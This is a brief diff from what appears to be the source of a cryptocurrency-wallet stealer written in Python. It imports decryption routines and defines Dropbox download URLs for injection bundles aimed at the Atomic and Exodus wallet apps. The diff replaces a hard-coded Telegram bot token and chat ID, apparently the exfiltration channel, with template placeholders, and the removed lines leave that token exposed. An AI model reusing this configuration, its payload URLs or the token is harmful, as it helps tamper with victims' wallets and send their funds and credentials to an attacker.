@@ -31,8 +31,8 @@ from cryptography.hazmat.backends import default_backend # type: ignore
 from Crypto.Cipher import DES3, AES # type: ignore
 from Crypto.Protocol.KDF import PBKDF2 # type: ignore
 
-TOKEN = "6412347716:AAFL5wPS5gm0fx28XCBk0D4sxnkAwvBDz6E"
-CHAT_ID = "-1002219378034"
+TOKEN = "%TOKEN%"
+CHAT_ID = "%CHAT_ID%"
 
 atomic_injection_url = "https://www.dropbox.com/scl/fi/xtt2n593d5n4svefktjhy/atomic.asar?rlkey=5refutaevle4aapp0p6hgn7q1&st=xthb3wxt&dl=0"
 exodus_injection_url = "https://www.dropbox.com/scl/fi/3clo0b3x6nfajqm27kvx6/exodus.asar?rlkey=200tiyus0rc0u3u4j9kf517l0&st=d3gcvfd5&dl=1"
